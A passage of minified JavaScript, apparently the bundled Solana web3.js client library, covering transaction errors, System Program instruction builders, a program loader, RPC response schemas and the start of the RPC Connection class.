n=r.accounts.map(e=>{let r=t.accountKeys[e];return{pubkey:r,isSigner:i.signatures.some(t=>t.publicKey.toString()===r.toString())||t.isAccountSigner(e),isWritable:t.isAccountWritable(e)}});i.instructions.push(new nG({keys:n,programId:t.accountKeys[r.programIdIndex],data:e(t4).decode(r.data)}))}),i._message=t,i._json=i.toJSON(),i}}const nY=new nT("SysvarC1ock11111111111111111111111111111111");new nT("SysvarEpochSchedu1e111111111111111111111111"),new nT("Sysvar1nstructions1111111111111111111111111");const nX=new nT("SysvarRecentB1ockHashes11111111111111111111"),nQ=new nT("SysvarRent111111111111111111111111111111111");new nT("SysvarRewards111111111111111111111111111111"),new nT("SysvarS1otHashes111111111111111111111111111"),new nT("SysvarS1otHistory11111111111111111111111111");const n0=new nT("SysvarStakeHistory1111111111111111111111111");class n1 extends Error{constructor({action:t,signature:e,transactionMessage:r,logs:i}){let n;let o=i?`Logs: 
${JSON.stringify(i.slice(-10),null,2)}. `:"",s="\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.";switch(t){case"send":n=`Transaction ${e} resulted in an error. 
${r}. `+o+s;break;case"simulate":n=`Simulation failed. 
Message: ${r}. 
`+o+s;break;default:n=`Unknown action '${t}'`}super(n),this.signature=void 0,this.transactionMessage=void 0,this.transactionLogs=void 0,this.signature=e,this.transactionMessage=r,this.transactionLogs=i||void 0}get transactionError(){return{message:this.transactionMessage,logs:Array.isArray(this.transactionLogs)?this.transactionLogs:void 0}}get logs(){let t=this.transactionLogs;if(null==t||"object"!=typeof t||!("then"in t))return t}async getLogs(t){return Array.isArray(this.transactionLogs)||(this.transactionLogs=new Promise((e,r)=>{t.getTransaction(this.signature).then(t=>{if(t&&t.meta&&t.meta.logMessages){let r=t.meta.logMessages;this.transactionLogs=r,e(r)}else r(Error("Log messages not found"))}).catch(r)})),await this.transactionLogs}}class n2 extends Error{constructor({code:t,message:e,data:r},i){super(null!=i?`${i}: ${e}`:e),this.code=void 0,this.data=void 0,this.code=t,this.data=r,this.name="SolanaJSONRPCError"}}async function n3(t,e,r,i){let n;let o=i&&{skipPreflight:i.skipPreflight,preflightCommitment:i.preflightCommitment||i.commitment,maxRetries:i.maxRetries,minContextSlot:i.minContextSlot},s=await t.sendTransaction(e,r,o);if(null!=e.recentBlockhash&&null!=e.lastValidBlockHeight)n=(await t.confirmTransaction({abortSignal:i?.abortSignal,signature:s,blockhash:e.recentBlockhash,lastValidBlockHeight:e.lastValidBlockHeight},i&&i.commitment)).value;else if(null!=e.minNonceContextSlot&&null!=e.nonceInfo){let{nonceInstruction:r}=e.nonceInfo,o=r.keys[0].pubkey;n=(await t.confirmTransaction({abortSignal:i?.abortSignal,minContextSlot:e.minNonceContextSlot,nonceAccountPubkey:o,nonceValue:e.nonceInfo.nonce,signature:s},i&&i.commitment)).value}else i?.abortSignal!=null&&console.warn("sendAndConfirmTransaction(): A transaction with a deprecated confirmation strategy was supplied along with an `abortSignal`. Only transactions having `lastValidBlockHeight` or a combination of `nonceInfo` and `minNonceContextSlot` are abortable."),n=(await t.confirmTransaction(s,i&&i.commitment)).value;if(n.err){if(null!=s)throw new n1({action:"send",signature:s,transactionMessage:`Status: (${JSON.stringify(n)})`});throw Error(`Transaction ${s} failed (${JSON.stringify(n)})`)}return s}function n8(t){return new Promise(e=>setTimeout(e,t))}function n6(t,e){let r=t.layout.span>=0?t.layout.span:function t(e,r){let i=e=>{if(e.span>=0)return e.span;if("function"==typeof e.alloc)return e.alloc(r[e.property]);if("count"in e&&"elementLayout"in e){let t=r[e.property];if(Array.isArray(t))return t.length*i(e.elementLayout)}else if("fields"in e)return t({layout:e},r[e.property]);return 0},n=0;return e.layout.fields.forEach(t=>{n+=i(t)}),n}(t,e),i=(0,f.Buffer).alloc(r),n=Object.assign({instruction:t.index},e);return t.layout.encode(n,i),i}const n5=eW.nu64("lamportsPerSignature"),n4=eW.struct([eW.u32("version"),eW.u32("state"),nU("authorizedPubkey"),nU("nonce"),eW.struct([n5],"feeCalculator")]),n9=n4.span;class n7{constructor(t){this.authorizedPubkey=void 0,this.nonce=void 0,this.feeCalculator=void 0,this.authorizedPubkey=t.authorizedPubkey,this.nonce=t.nonce,this.feeCalculator=t.feeCalculator}static fromAccountData(t){let e=n4.decode(n_(t),0);return new n7({authorizedPubkey:new nT(e.authorizedPubkey),nonce:new nT(e.nonce).toString(),feeCalculator:e.feeCalculator})}}const ot=t=>({decode:t.decode.bind(t),encode:t.encode.bind(t)}),oe=t=>{let e=(0,eW.blob)(8,t),{encode:r,decode:i}=ot(e);return e.decode=(t,e)=>{let r=i(t,e);return(0,rd.toBigIntLE)((0,f.Buffer).from(r))},e.encode=(t,e,i)=>r((0,rd.toBufferLE)(t,8),e,i),e},or=Object.freeze({Create:{index:0,layout:eW.struct([eW.u32("instruction"),eW.ns64("lamports"),eW.ns64("space"),nU("programId")])},Assign:{index:1,layout:eW.struct([eW.u32("instruction"),nU("programId")])},Transfer:{index:2,layout:eW.struct([eW.u32("instruction"),oe("lamports")])},CreateWithSeed:{index:3,layout:eW.struct([eW.u32("instruction"),nU("base"),nN("seed"),eW.ns64("lamports"),eW.ns64("space"),nU("programId")])},AdvanceNonceAccount:{index:4,layout:eW.struct([eW.u32("instruction")])},WithdrawNonceAccount:{index:5,layout:eW.struct([eW.u32("instruction"),eW.ns64("lamports")])},InitializeNonceAccount:{index:6,layout:eW.struct([eW.u32("instruction"),nU("authorized")])},AuthorizeNonceAccount:{index:7,layout:eW.struct([eW.u32("instruction"),nU("authorized")])},Allocate:{index:8,layout:eW.struct([eW.u32("instruction"),eW.ns64("space")])},AllocateWithSeed:{index:9,layout:eW.struct([eW.u32("instruction"),nU("base"),nN("seed"),eW.ns64("space"),nU("programId")])},AssignWithSeed:{index:10,layout:eW.struct([eW.u32("instruction"),nU("base"),nN("seed"),nU("programId")])},TransferWithSeed:{index:11,layout:eW.struct([eW.u32("instruction"),oe("lamports"),nN("seed"),nU("programId")])},UpgradeNonceAccount:{index:12,layout:eW.struct([eW.u32("instruction")])}});class oi{constructor(){}static createAccount(t){let e=n6(or.Create,{lamports:t.lamports,space:t.space,programId:n_(t.programId.toBuffer())});return new nG({keys:[{pubkey:t.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:t.newAccountPubkey,isSigner:!0,isWritable:!0}],programId:this.programId,data:e})}static transfer(t){let e,r;return"basePubkey"in t?(e=n6(or.TransferWithSeed,{lamports:BigInt(t.lamports),seed:t.seed,programId:n_(t.programId.toBuffer())}),r=[{pubkey:t.fromPubkey,isSigner:!1,isWritable:!0},{pubkey:t.basePubkey,isSigner:!0,isWritable:!1},{pubkey:t.toPubkey,isSigner:!1,isWritable:!0}]):(e=n6(or.Transfer,{lamports:BigInt(t.lamports)}),r=[{pubkey:t.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:t.toPubkey,isSigner:!1,isWritable:!0}]),new nG({keys:r,programId:this.programId,data:e})}static assign(t){let e,r;return"basePubkey"in t?(e=n6(or.AssignWithSeed,{base:n_(t.basePubkey.toBuffer()),seed:t.seed,programId:n_(t.programId.toBuffer())}),r=[{pubkey:t.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:t.basePubkey,isSigner:!0,isWritable:!1}]):(e=n6(or.Assign,{programId:n_(t.programId.toBuffer())}),r=[{pubkey:t.accountPubkey,isSigner:!0,isWritable:!0}]),new nG({keys:r,programId:this.programId,data:e})}static createAccountWithSeed(t){let e=n6(or.CreateWithSeed,{base:n_(t.basePubkey.toBuffer()),seed:t.seed,lamports:t.lamports,space:t.space,programId:n_(t.programId.toBuffer())}),r=[{pubkey:t.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:t.newAccountPubkey,isSigner:!1,isWritable:!0}];return t.basePubkey.equals(t.fromPubkey)||r.push({pubkey:t.basePubkey,isSigner:!0,isWritable:!1}),new nG({keys:r,programId:this.programId,data:e})}static createNonceAccount(t){let e=new nJ;"basePubkey"in t&&"seed"in t?e.add(oi.createAccountWithSeed({fromPubkey:t.fromPubkey,newAccountPubkey:t.noncePubkey,basePubkey:t.basePubkey,seed:t.seed,lamports:t.lamports,space:n9,programId:this.programId})):e.add(oi.createAccount({fromPubkey:t.fromPubkey,newAccountPubkey:t.noncePubkey,lamports:t.lamports,space:n9,programId:this.programId}));let r={noncePubkey:t.noncePubkey,authorizedPubkey:t.authorizedPubkey};return e.add(this.nonceInitialize(r)),e}static nonceInitialize(t){let e=n6(or.InitializeNonceAccount,{authorized:n_(t.authorizedPubkey.toBuffer())});return new nG({keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:nX,isSigner:!1,isWritable:!1},{pubkey:nQ,isSigner:!1,isWritable:!1}],programId:this.programId,data:e})}static nonceAdvance(t){let e=n6(or.AdvanceNonceAccount);return new nG({keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:nX,isSigner:!1,isWritable:!1},{pubkey:t.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:e})}static nonceWithdraw(t){let e=n6(or.WithdrawNonceAccount,{lamports:t.lamports});return new nG({keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:t.toPubkey,isSigner:!1,isWritable:!0},{pubkey:nX,isSigner:!1,isWritable:!1},{pubkey:nQ,isSigner:!1,isWritable:!1},{pubkey:t.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:e})}static nonceAuthorize(t){let e=n6(or.AuthorizeNonceAccount,{authorized:n_(t.newAuthorizedPubkey.toBuffer())});return new nG({keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:t.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:e})}static allocate(t){let e,r;return"basePubkey"in t?(e=n6(or.AllocateWithSeed,{base:n_(t.basePubkey.toBuffer()),seed:t.seed,space:t.space,programId:n_(t.programId.toBuffer())}),r=[{pubkey:t.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:t.basePubkey,isSigner:!0,isWritable:!1}]):(e=n6(or.Allocate,{space:t.space}),r=[{pubkey:t.accountPubkey,isSigner:!0,isWritable:!0}]),new nG({keys:r,programId:this.programId,data:e})}}oi.programId=new nT("11111111111111111111111111111111");class on{constructor(){}static getMinNumSignatures(t){return 2*(Math.ceil(t/on.chunkSize)+1+1)}static async load(t,e,r,i,n){{let o=await t.getMinimumBalanceForRentExemption(n.length),s=await t.getAccountInfo(r.publicKey,"confirmed"),a=null;if(null!==s){if(s.executable)return console.error("Program load failed, account is already executable"),!1;s.data.length!==n.length&&(a=a||new nJ).add(oi.allocate({accountPubkey:r.publicKey,space:n.length})),s.owner.equals(i)||(a=a||new nJ).add(oi.assign({accountPubkey:r.publicKey,programId:i})),s.lamports<o&&(a=a||new nJ).add(oi.transfer({fromPubkey:e.publicKey,toPubkey:r.publicKey,lamports:o-s.lamports}))}else a=new nJ().add(oi.createAccount({fromPubkey:e.publicKey,newAccountPubkey:r.publicKey,lamports:o>0?o:1,space:n.length,programId:i}));null!==a&&await n3(t,a,[e,r],{commitment:"confirmed"})}let o=eW.struct([eW.u32("instruction"),eW.u32("offset"),eW.u32("bytesLength"),eW.u32("bytesLengthPadding"),eW.seq(eW.u8("byte"),eW.offset(eW.u32(),-8),"bytes")]),s=on.chunkSize,a=0,u=n,l=[];for(;u.length>0;){let n=u.slice(0,s),c=(0,f.Buffer).alloc(s+16);o.encode({instruction:0,offset:a,bytes:n,bytesLength:0,bytesLengthPadding:0},c);let h=new nJ().add({keys:[{pubkey:r.publicKey,isSigner:!0,isWritable:!0}],programId:i,data:c});l.push(n3(t,h,[e,r],{commitment:"confirmed"})),t._rpcEndpoint.includes("solana.com")&&await n8(250),a+=s,u=u.slice(s)}await Promise.all(l);{let n=eW.struct([eW.u32("instruction")]),o=(0,f.Buffer).alloc(n.span);n.encode({instruction:1},o);let s=new nJ().add({keys:[{pubkey:r.publicKey,isSigner:!0,isWritable:!0},{pubkey:nQ,isSigner:!1,isWritable:!1}],programId:i,data:o}),a="processed",u=await t.sendTransaction(s,[e,r],{preflightCommitment:a}),{context:l,value:c}=await t.confirmTransaction({signature:u,lastValidBlockHeight:s.lastValidBlockHeight,blockhash:s.recentBlockhash},a);if(c.err)throw Error(`Transaction ${u} failed (${JSON.stringify(c)})`);for(;;){try{if(await t.getSlot({commitment:a})>l.slot)break}catch{}await new Promise(t=>setTimeout(t,Math.round(200)))}}return!0}}on.chunkSize=932,new nT("BPFLoader2111111111111111111111111111111111");var oo=(i=function(){if(s)return o;s=1;var t=Object.prototype.toString,e=Object.keys||function(t){var e=[];for(var r in t)e.push(r);return e};return o=function(r){var i=function r(i,n){var o,s,a,u,l,c,h;if(!0===i)return"true";if(!1===i)return"false";switch(typeof i){case"object":if(null===i)return null;if(i.toJSON&&"function"==typeof i.toJSON)return r(i.toJSON(),n);if("[object Array]"===(h=t.call(i))){for(o=0,a="[",s=i.length-1;o<s;o++)a+=r(i[o],!0)+",";return s>-1&&(a+=r(i[o],!0)),a+"]"}if("[object Object]"!==h)return JSON.stringify(i);for(s=(u=e(i).sort()).length,a="",o=0;o<s;)void 0!==(c=r(i[l=u[o]],!1))&&(a&&(a+=","),a+=JSON.stringify(l)+":"+c),o++;return"{"+a+"}";case"function":case"undefined":return n?null:void 0;case"string":return JSON.stringify(i);default:return isFinite(i)?i:null}}(r,!1);if(void 0!==i)return""+i}}())&&i.__esModule&&Object.prototype.hasOwnProperty.call(i,"default")?i.default:i;function os(t){let e=0;for(;t>1;)t/=2,e++;return e}class oa{constructor(t,e,r,i,n){this.slotsPerEpoch=void 0,this.leaderScheduleSlotOffset=void 0,this.warmup=void 0,this.firstNormalEpoch=void 0,this.firstNormalSlot=void 0,this.slotsPerEpoch=t,this.leaderScheduleSlotOffset=e,this.warmup=r,this.firstNormalEpoch=i,this.firstNormalSlot=n}getEpoch(t){return this.getEpochAndSlotIndex(t)[0]}getEpochAndSlotIndex(t){if(t<this.firstNormalSlot){var e;let r=os(0===(e=t+32+1)?1:(e--,e|=e>>1,e|=e>>2,e|=e>>4,e|=e>>8,e|=e>>16,(e|=e>>32)+1))-os(32)-1,i=this.getSlotsInEpoch(r);return[r,t-(i-32)]}{let e=t-this.firstNormalSlot,r=Math.floor(e/this.slotsPerEpoch);return[this.firstNormalEpoch+r,e%this.slotsPerEpoch]}}getFirstSlotInEpoch(t){return t<=this.firstNormalEpoch?(Math.pow(2,t)-1)*32:(t-this.firstNormalEpoch)*this.slotsPerEpoch+this.firstNormalSlot}getLastSlotInEpoch(t){return this.getFirstSlotInEpoch(t)+this.getSlotsInEpoch(t)-1}getSlotsInEpoch(t){return t<this.firstNormalEpoch?Math.pow(2,t+os(32)):this.slotsPerEpoch}}var ou=globalThis.fetch;class ol extends r8{constructor(t,e,r){super(t=>{let r=new r2(t,{autoconnect:!0,max_reconnects:5,reconnect:!0,reconnect_interval:1e3,...e});return"socket"in r?this.underlyingSocket=r.socket:this.underlyingSocket=r,r},t,e,r),this.underlyingSocket=void 0}call(...t){let e=this.underlyingSocket?.readyState;return 1===e?super.call(...t):Promise.reject(Error("Tried to call a JSON-RPC method `"+t[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+e+")"))}notify(...t){let e=this.underlyingSocket?.readyState;return 1===e?super.notify(...t):Promise.reject(Error("Tried to send a JSON-RPC notification `"+t[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+e+")"))}}class oc{constructor(t){this.key=void 0,this.state=void 0,this.key=t.key,this.state=t.state}isActive(){let t=BigInt("0xffffffffffffffff");return this.state.deactivationSlot===t}static deserialize(t){let e=function(t,e){let r;try{r=t.layout.decode(e)}catch(t){throw Error("invalid instruction; "+t)}if(r.typeIndex!==t.index)throw Error(`invalid account data; account type mismatch ${r.typeIndex} != ${t.index}`);return r}(oh,t),r=t.length-56;nq(r>=0,"lookup table is invalid"),nq(r%32==0,"lookup table is invalid");let{addresses:i}=eW.struct([eW.seq(nU(),r/32,"addresses")]).decode(t.slice(56));return{deactivationSlot:e.deactivationSlot,lastExtendedSlot:e.lastExtendedSlot,lastExtendedSlotStartIndex:e.lastExtendedStartIndex,authority:0!==e.authority.length?new nT(e.authority[0]):void 0,addresses:i.map(t=>new nT(t))}}}const oh={index:1,layout:eW.struct([eW.u32("typeIndex"),oe("deactivationSlot"),eW.nu64("lastExtendedSlot"),eW.u8("lastExtendedStartIndex"),eW.u8(),eW.seq(nU(),eW.offset(eW.u8(),-1),"authority")])},of=/^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i,od=rz(r_(nT),rP(),t=>new nT(t)),op=rR([rP(),rI("base64")]),og=rz(r_(f.Buffer),op,t=>(0,f.Buffer).from(t[0],"base64"));function om(t){let e,r;if("string"==typeof t)e=t;else if(t){let{commitment:i,...n}=t;e=i,r=n}return{commitment:e,config:r}}function oy(t){return t.map(t=>"memcmp"in t?{...t,memcmp:{...t.memcmp,encoding:t.memcmp.encoding??"base58"}}:t)}function ob(t){return rU([rC({jsonrpc:rI("2.0"),id:rP(),result:t}),rC({jsonrpc:rI("2.0"),id:rP(),error:rC({code:rN(),message:rP(),data:rT(rB("any",()=>!0))})})])}const ow=ob(rN());function ov(t){return rz(ob(t),ow,e=>"error"in e?e:{...e,result:rk(e.result,t)})}function ox(t){return ov(rC({context:rC({slot:rL()}),value:t}))}function ok(t){return rC({context:rC({slot:rL()}),value:t})}function oS(t,r){return 0===t?new nV({header:r.header,staticAccountKeys:r.accountKeys.map(t=>new nT(t)),recentBlockhash:r.recentBlockhash,compiledInstructions:r.instructions.map(t=>({programIdIndex:t.programIdIndex,accountKeyIndexes:t.accounts,data:e(t4).decode(t.data)})),addressTableLookups:r.addressTableLookups}):new nK(r)}const oB=rC({foundation:rL(),foundationTerm:rL(),initial:rL(),taper:rL(),terminal:rL()}),oE=ov(rE(rM(rC({epoch:rL(),effectiveSlot:rL(),amount:rL(),postBalance:rL(),commission:rT(rM(rL()))})))),oA=rE(rC({slot:rL(),prioritizationFee:rL()})),o_=rC({total:rL(),validator:rL(),foundation:rL(),epoch:rL()}),oI=rC({epoch:rL(),slotIndex:rL(),slotsInEpoch:rL(),absoluteSlot:rL(),blockHeight:rT(rL()),transactionCount:rT(rL())}),oM=rC({slotsPerEpoch:rL(),leaderScheduleSlotOffset:rL(),warmup:rA(),firstNormalEpoch:rL(),firstNormalSlot:rL()}),oL=rO(rP(),rE(rL())),oT=rM(rU([rC({}),rP()])),oO=rC({err:oT}),oP=rI("receivedSignature"),oR=rC({"solana-core":rP(),"feature-set":rT(rL())}),oC=rC({program:rP(),programId:od,parsed:rN()}),oU=rC({programId:od,accounts:rE(od),data:rP()}),oN=ox(rC({err:rM(rU([rC({}),rP()])),logs:rM(rE(rP())),accounts:rT(rM(rE(rM(rC({executable:rA(),owner:rP(),lamports:rL(),data:rE(rP()),rentEpoch:rT(rL())}))))),unitsConsumed:rT(rL()),returnData:rT(rM(rC({programId:rP(),data:rR([rP(),rI("base64")])}))),innerInstructions:rT(rM(rE(rC({index:rL(),instructions:rE(rU([oC,oU]))}))))})),oz=ox(rC({byIdentity:rO(rP(),rE(rL())),range:rC({firstSlot:rL(),lastSlot:rL()})})),oH=ov(oB),oq=ov(o_),oW=ov(oA),oF=ov(oI),oD=ov(oM),oj=ov(oL),oK=ov(rL()),oV=ox(rC({total:rL(),circulating:rL(),nonCirculating:rL(),nonCirculatingAccounts:rE(od)})),o$=rC({amount:rP(),uiAmount:rM(rL()),decimals:rL(),uiAmountString:rT(rP())}),oZ=ox(rE(rC({address:od,amount:rP(),uiAmount:rM(rL()),decimals:rL(),uiAmountString:rT(rP())}))),oG=ox(rE(rC({pubkey:od,account:rC({executable:rA(),owner:od,lamports:rL(),data:og,rentEpoch:rL()})}))),oJ=rC({program:rP(),parsed:rN(),space:rL()}),oY=ox(rE(rC({pubkey:od,account:rC({executable:rA(),owner:od,lamports:rL(),data:oJ,rentEpoch:rL()})}))),oX=ox(rE(rC({lamports:rL(),address:od}))),oQ=rC({executable:rA(),owner:od,lamports:rL(),data:og,rentEpoch:rL()}),o0=rC({pubkey:od,account:oQ}),o1=rz(rU([r_(f.Buffer),oJ]),rU([op,oJ]),t=>Array.isArray(t)?rk(t,og):t),o2=rC({executable:rA(),owner:od,lamports:rL(),data:o1,rentEpoch:rL()}),o3=rC({pubkey:od,account:o2}),o8=rC({state:rU([rI("active"),rI("inactive"),rI("activating"),rI("deactivating")]),active:rL(),inactive:rL()}),o6=ov(rE(rC({signature:rP(),slot:rL(),err:oT,memo:rM(rP()),blockTime:rT(rM(rL()))}))),o5=ov(rE(rC({signature:rP(),slot:rL(),err:oT,memo:rM(rP()),blockTime:rT(rM(rL()))}))),o4=rC({subscription:rL(),result:ok(oQ)}),o9=rC({pubkey:od,account:oQ}),o7=rC({subscription:rL(),result:ok(o9)}),st=rC({parent:rL(),slot:rL(),root:rL()}),se=rC({subscription:rL(),result:st}),sr=rU([rC({type:rU([rI("firstShredReceived"),rI("completed"),rI("optimisticConfirmation"),rI("root")]),slot:rL(),timestamp:rL()}),rC({type:rI("createdBank"),parent:rL(),slot:rL(),timestamp:rL()}),rC({type:rI("frozen"),slot:rL(),timestamp:rL(),stats:rC({numTransactionEntries:rL(),numSuccessfulTransactions:rL(),numFailedTransactions:rL(),maxTransactionsPerEntry:rL()})}),rC({type:rI("dead"),slot:rL(),timestamp:rL(),err:rP()})]),si=rC({subscription:rL(),result:sr}),sn=rC({subscription:rL(),result:ok(rU([oO,oP]))}),so=rC({subscription:rL(),result:rL()}),ss=rC({pubkey:rP(),gossip:rM(rP()),tpu:rM(rP()),rpc:rM(rP()),version:rM(rP())}),sa=rC({votePubkey:rP(),nodePubkey:rP(),activatedStake:rL(),epochVoteAccount:rA(),epochCredits:rE(rR([rL(),rL(),rL()])),commission:rL(),lastVote:rL(),rootSlot:rM(rL())}),su=ov(rC({current:rE(sa),delinquent:rE(sa)})),sl=rU([rI("processed"),rI("confirmed"),rI("finalized")]),sc=rC({slot:rL(),confirmations:rM(rL()),err:oT,confirmationStatus:rT(sl)}),sh=ox(rE(rM(sc))),sf=ov(rL()),sd=rC({accountKey:od,writableIndexes:rE(rL()),readonlyIndexes:rE(rL())}),sp=rC({signatures:rE(rP()),message:rC({accountKeys:rE(rP()),header:rC({numRequiredSignatures:rL(),numReadonlySignedAccounts:rL(),numReadonlyUnsignedAccounts:rL()}),instructions:rE(rC({accounts:rE(rL()),data:rP(),programIdIndex:rL()})),recentBlockhash:rP(),addressTableLookups:rT(rE(sd))})}),sg=rC({pubkey:od,signer:rA(),writable:rA(),source:rT(rU([rI("transaction"),rI("lookupTable")]))}),sm=rC({accountKeys:rE(sg),signatures:rE(rP())}),sy=rC({parsed:rN(),program:rP(),programId:od}),sb=rC({accounts:rE(od),data:rP(),programId:od}),sw=rz(rU([sb,sy]),rU([rC({parsed:rN(),program:rP(),programId:rP()}),rC({accounts:rE(rP()),data:rP(),programId:rP()})]),t=>"accounts"in t?rk(t,sb):rk(t,sy)),sv=rC({signatures:rE(rP()),message:rC({accountKeys:rE(sg),instructions:rE(sw),recentBlockhash:rP(),addressTableLookups:rT(rM(rE(sd)))})}),sx=rC({accountIndex:rL(),mint:rP(),owner:rT(rP()),programId:rT(rP()),uiTokenAmount:o$}),sk=rC({writable:rE(od),readonly:rE(od)}),sS=rC({err:oT,fee:rL(),innerInstructions:rT(rM(rE(rC({index:rL(),instructions:rE(rC({accounts:rE(rL()),data:rP(),programIdIndex:rL()}))})))),preBalances:rE(rL()),postBalances:rE(rL()),logMessages:rT(rM(rE(rP()))),preTokenBalances:rT(rM(rE(sx))),postTokenBalances:rT(rM(rE(sx))),loadedAddresses:rT(sk),computeUnitsConsumed:rT(rL())}),sB=rC({err:oT,fee:rL(),innerInstructions:rT(rM(rE(rC({index:rL(),instructions:rE(sw)})))),preBalances:rE(rL()),postBalances:rE(rL()),logMessages:rT(rM(rE(rP()))),preTokenBalances:rT(rM(rE(sx))),postTokenBalances:rT(rM(rE(sx))),loadedAddresses:rT(sk),computeUnitsConsumed:rT(rL())}),sE=rU([rI(0),rI("legacy")]),sA=rC({pubkey:rP(),lamports:rL(),postBalance:rM(rL()),rewardType:rM(rP()),commission:rT(rM(rL()))}),s_=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),transactions:rE(rC({transaction:sp,meta:rM(sS),version:rT(sE)})),rewards:rT(rE(sA)),blockTime:rM(rL()),blockHeight:rM(rL())}))),sI=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),rewards:rT(rE(sA)),blockTime:rM(rL()),blockHeight:rM(rL())}))),sM=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),transactions:rE(rC({transaction:sm,meta:rM(sS),version:rT(sE)})),rewards:rT(rE(sA)),blockTime:rM(rL()),blockHeight:rM(rL())}))),sL=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),transactions:rE(rC({transaction:sv,meta:rM(sB),version:rT(sE)})),rewards:rT(rE(sA)),blockTime:rM(rL()),blockHeight:rM(rL())}))),sT=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),transactions:rE(rC({transaction:sm,meta:rM(sB),version:rT(sE)})),rewards:rT(rE(sA)),blockTime:rM(rL()),blockHeight:rM(rL())}))),sO=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),rewards:rT(rE(sA)),blockTime:rM(rL()),blockHeight:rM(rL())}))),sP=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),transactions:rE(rC({transaction:sp,meta:rM(sS)})),rewards:rT(rE(sA)),blockTime:rM(rL())}))),sR=ov(rM(rC({blockhash:rP(),previousBlockhash:rP(),parentSlot:rL(),signatures:rE(rP()),blockTime:rM(rL())}))),sC=ov(rM(rC({slot:rL(),meta:rM(sS),blockTime:rT(rM(rL())),transaction:sp,version:rT(sE)}))),sU=ov(rM(rC({slot:rL(),transaction:sv,meta:rM(sB),blockTime:rT(rM(rL())),version:rT(sE)}))),sN=ox(rC({blockhash:rP(),lastValidBlockHeight:rL()})),sz=ox(rA()),sH=ov(rE(rC({slot:rL(),numTransactions:rL(),numSlots:rL(),samplePeriodSecs:rL()}))),sq=ox(rM(rC({feeCalculator:rC({lamportsPerSignature:rL()})}))),sW=ov(rP()),sF=ov(rP()),sD=rC({err:oT,logs:rE(rP()),signature:rP()}),sj=rC({result:ok(sD),subscription:rL()}),sK={"solana-client":"js/1.0.0-maintenance"};class sV{constructor(t,r){var i,n;let o,s,a,u,l,c;this._commitment=void 0,this._confirmTransactionInitialTimeout=void 0,this._rpcEndpoint=void 0,this._rpcWsEndpoint=void 0,this._rpcClient=void 0,this._rpcRequest=void 0,this._rpcBatchRequest=void 0,this._rpcWebSocket=void 0,this._rpcWebSocketConnected=!1,this._rpcWebSocketHeartbeat=null,this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketGeneration=0,this._disableBlockhashCaching=!1,this._pollingBlockhash=!1,this._blockhashInfo={latestBlockhash:null,lastFetch:0,transactionSignatures:[],simulatedSignatures:[]},this._nextClientSubscriptionId=0,this._subscriptionDisposeFunctionsByClientSubscriptionId={},this._subscriptionHashByClientSubscriptionId={},this._subscriptionStateChangeCallbacksByHash={},this._subscriptionCallbacksByServerSubscriptionId={},this._subscriptionsByHash={},this._subscriptionsAutoDisposedByRpc=new Set,this.getBlockHeight=(()=>{let t={};return async e=>{let{commitment:r,config:i}=om(e),n=this._buildArgs([],r,void 0,i),o=oo(n);return t[o]=t[o]??(async()=>{try{let t=await this._rpcRequest("getBlockHeight",n),e=rk(t,ov(rL()));if("error"in e)throw new n2(e.error,"failed to get block height information");return e.result}finally{delete t[o]}})(),await t[o]}})(),r&&"string"==typeof r?this._commitment=r:r&&(this._commitment=r.commitment,this._confirmTransactionInitialTimeout=r.confirmTransactionInitialTimeout,o=r.wsEndpoint,s=r.httpHeaders,a=r.fetch,u=r.fetchMiddleware,l=r.disableRetryOnRateLimit,c=r.httpAgent),this._rpcEndpoint=function(t){if(!1===/^https?:/.test(t))throw TypeError("Endpoint URL must start with `http:` or `https:`.");return t}(t),this._rpcWsEndpoint=o||function(t){let e=t.match(of);if(null==e)throw TypeError(`Failed to validate endpoint URL \`${t}\``);let[r,i,n,o]=e,s=t.startsWith("https:")?"wss:":"ws:",a=null==n?null:parseInt(n.slice(1),10),u=null==a?"":`:${a+1}`;return`${s}//${i}${u}${o}`}(t),this._rpcClient=function(t,r,i,n,o,s){let a,u;let l=i||ou;return null!=s&&console.warn("You have supplied an `httpAgent` when creating a `Connection` in a browser environment.It has been ignored; `httpAgent` is only used in Node environments."),n&&(u=async(t,e)=>{let r=await new Promise((r,i)=>{try{n(t,e,(t,e)=>r([t,e]))}catch(t){i(t)}});return await l(...r)}),new(e(rH))(async(e,i)=>{let n={method:"POST",body:e,agent:a,headers:Object.assign({"Content-Type":"application/json"},r||{},sK)};try{let e,r=5,s=500;for(;e=u?await u(t,n):await l(t,n),429===e.status&&!0!==o&&(r-=1,0!==r);)console.error(`Server responded with ${e.status} ${e.statusText}.  Retrying after ${s}ms delay...`),await n8(s),s*=2;let a=await e.text();e.ok?i(null,a):i(Error(`${e.status} ${e.statusText}: ${a}`))}catch(t){t instanceof Error&&i(t)}},{})}(t,s,a,u,l,c),this._rpcRequest=(i=this._rpcClient,(t,e)=>new Promise((r,n)=>{i.request(t,e,(t,e)=>{if(t){n(t);return}r(e)})})),this._rpcBatchRequest=(n=this._rpcClient,t=>new Promise((e,r)=>{0===t.length&&e([]);let 